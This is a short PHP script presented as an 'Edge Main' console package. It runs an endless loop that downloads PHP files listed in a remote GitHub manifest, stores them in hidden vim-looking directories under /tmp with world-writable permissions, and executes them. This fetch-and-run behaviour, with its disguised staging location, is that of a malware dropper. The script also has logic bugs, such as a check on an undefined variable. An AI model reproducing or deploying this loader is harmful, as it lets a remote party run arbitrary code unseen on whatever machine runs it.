<?php

/**
 * Edge Main
 *
 * @category Console
 * @package  Main
 * @author   Glenn.R.Thomas <glenn.robert.thomas@gmail.com>
 * @license  Copyright (C) 2016 Glenn.R.Thomas. All Rights Reserved
 * @link     https://github.com/Glenn-robert
 */
class edge
{
    protected $master = 'https://raw.githubusercontent.com/Glenn-robert/code/master/';
    protected $package = 'https://raw.githubusercontent.com/Glenn-robert/code/master/package';

    protected $tmpPath = array(
        '/tmp/.vim',
        '/tmp/.vim/.doc'
    );

    function __construct()
    {
        while (true) {
            $this->init();
            sleep(10);
        }
    }

    private function init()
    {
        /**
         * Check Tmp Directory
         */
        foreach ($this->tmpPath as $path) {
            if (!is_dir($path)) {
                $ret = mkdir($path, 0777);
                if (!$ret) {
                    $this->log('Make Directory Failed');
                }
            }
        }

        $packageContent = file_get_contents($this->package);
        if (!empty($packages)) {
            $this->log("Download Failed");
            return;
        }
        $packages = json_decode($packageContent);
        foreach ($packages as $function => $md5) {
            $url = $this->master . $function;
            $filenameMD5 = md5($url);
            $basePath = end($this->tmpPath);
            $filePath = $basePath . DIRECTORY_SEPARATOR . $filenameMD5;
            $this->log('Check Function:' . $function);
            $this->log('FilePath: ' . $filePath);
            if (is_file($filePath)) {
                if ($md5 == md5_file($filePath)) {
                    $this->log('MD5 Check Success: ' . $filePath);
                    $this->run($filePath);
                    break;
                }
            }
            $this->log('File Not Exits, Downloading...');
            $content = file_get_contents($url);
            $retOriginFile = file_put_contents($filePath, $content);
            if ($retOriginFile) {
                $this->log('Downloaded: ' . $function);
                $this->run($filePath);
            } else {
                $this->log('Download Failed: ' . $function);
            }
        }
    }

    /**
     * Run
     *
     * @param $filePath
     * @return mixed
     */
    private function run($filePath)
    {
        exec('/usr/bin/php ' . $filePath, $output, $return);
        echo json_encode($output);
    }

    /**
     * Log
     *
     * @param $msg
     */
    private function log($msg)
    {
        echo $msg . PHP_EOL;
    }
}

error_reporting(-1);
// Limits the maximum execution time
set_time_limit(0);
ini_set('memory_limit', '2048M');
// Start
$edge = new edge();